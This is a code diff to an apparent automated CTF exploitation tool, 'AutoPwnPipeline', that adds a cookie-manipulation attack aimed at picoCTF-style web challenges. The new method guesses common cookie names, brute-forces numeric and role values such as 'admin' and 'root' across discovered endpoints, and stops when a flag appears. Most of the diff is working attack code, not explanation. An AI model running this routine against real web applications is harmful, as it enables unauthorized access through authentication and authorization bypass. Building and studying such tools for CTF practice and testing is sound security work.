@@ -654,6 +654,16 @@ class AutoPwnPipeline:
         if any("session" in c.lower() or "token" in c.lower() for c in cookies):
             predictions.append(("cookie_manipulation", 0.6, "Session/token cookie detected - manipulation surface"))
 
+        # ── 6a. Parametric cookie prediction (name/id/cookie/user_id) ───
+        # Detect cookies that look like parametric values (name, id, cookie, user_id)
+        # which are common in picoCTF-style cookie brute-force challenges.
+        parametric_cookies = [c for c in cookies if any(k in c.lower() for k in ["name", "id", "cookie", "user", "page", "index", "num"])]
+        if parametric_cookies:
+            predictions.append(("cookie_manipulation", 0.9, f"Parametric cookie detected: {', '.join(parametric_cookies)} - brute-force surface"))
+        # Also detect /check or /search endpoints which often pair with cookie brute-force
+        if any(any(k in ep.lower() for k in ["check", "search", "cookie"]) for ep in endpoints):
+            predictions.append(("cookie_manipulation", 0.85, "Check/search endpoint detected - cookie brute-force surface"))
+
         # ── 6b. CBC Bit-Flip prediction (encrypted cookies) ─────────────
         # Detect cookies that are base64-encoded and contain high-entropy
         # (encrypted) data - likely CBC-encrypted JSON like picoCTF 'More Cookies'
@@ -739,6 +749,7 @@ class AutoPwnPipeline:
             "php_tricks": self._exploit_php_tricks,
             "eval_injection": self._exploit_eval_injection,
             "cbc_bitflip": self._exploit_cbc_bitflip,
+            "cookie_manipulation": self._exploit_cookie_brute_force,
             "cors": self._exploit_cors,
             "open_redirect": self._exploit_open_redirect,
             "hpp": self._exploit_hpp,
@@ -964,6 +975,8 @@ class AutoPwnPipeline:
             self._exploit_jwt()
         elif "Authentication Bypass" in title:
             self._exploit_auth_bypass()
+        elif "Cookie Manipulation" in title:
+            self._exploit_cookie_brute_force()
         elif "SSTI" in title:
             self._exploit_ssti()
         elif "LFI Filter Bypass" in title:
@@ -1138,6 +1151,71 @@ class AutoPwnPipeline:
             except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                 pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 continue
+
+    def _exploit_cookie_brute_force(self):
+        """
+        Exploit parametric cookies (like name, id, cookie, user_id)
+        by brute-forcing numeric ranges and common role values.
+        """
+        print_info("Exploiting Cookie Manipulation & Brute-Force...")
+        cookies = self.state.get("cookies", {})
+        if not cookies:
+            try:
+                r = self.session.get(self.target_url, timeout=8)
+                cookies = r.cookies.get_dict()
+            except Exception:
+                pass
+
+        # Always include common parametric cookie names even if not discovered,
+        # since picoCTF-style challenges often use a 'name' cookie set by JS.
+        # We'll try the discovered cookies first, then fall back to common names.
+        common_param_cookies = ["name", "id", "cookie", "user", "user_id", "page", "index", "num", "role"]
+        cookie_names = list(cookies.keys())
+        for c in common_param_cookies:
+            if c not in cookie_names:
+                cookie_names.append(c)
+
+        # Define candidate values to brute-force
+        # 1. Numeric values (common in IDs, page indices, cookie challenge indexes)
+        numeric_candidates = [str(i) for i in range(-5, 100)]
+        # 2. Common role/auth string candidates
+        string_candidates = ["admin", "guest", "user", "anonymous", "root", "true", "false", "1", "0", "yes", "no"]
+        candidates = numeric_candidates + string_candidates
+
+        # We will scan endpoints we discovered, prioritising root and endpoints containing 'check' or 'cookie'
+        endpoints_to_try = [self.target_url]
+        for ep in self.state.get("endpoints", []):
+            full_ep = urljoin(self.target_url, ep)
+            if full_ep not in endpoints_to_try:
+                endpoints_to_try.append(full_ep)
+        # Always include /check if not already present (common picoCTF cookie challenge endpoint)
+        check_ep = urljoin(self.target_url, "/check")
+        if check_ep not in endpoints_to_try:
+            endpoints_to_try.append(check_ep)
+
+        # Priority sort: endpoints containing 'check', 'admin', 'cookie', or '/search'
+        endpoints_to_try.sort(key=lambda x: any(k in x.lower() for k in ["check", "admin", "cookie", "search"]), reverse=True)
+
+        for cname in cookie_names:
+            # Only brute-force cookies that look like parameter properties, not Flask sessions or JWTs
+            if any(k in cname.lower() for k in ["session", "csrf", "jwt", "token"]) and cname.lower() != "session":
+                continue
+            
+            print_info(f"  Brute-forcing cookie '{cname}' against {len(endpoints_to_try)} endpoints...")
+            
+            for ep in endpoints_to_try:
+                found_flag = False
+                for val in candidates:
+                    try:
+                        r = self.session.get(ep, cookies={cname: val}, timeout=5)
+                        if self._check_and_store_flags(r.text, f"Cookie brute-force ({cname}={val}) against {ep}"):
+                            print_success(f"  Flag captured by setting cookie '{cname}' to '{val}' on {ep}!")
+                            found_flag = True
+                            break
+                    except Exception:
+                        pass
+                if found_flag:
+                    return
 
     def _exploit_auth_bypass(self):
         """
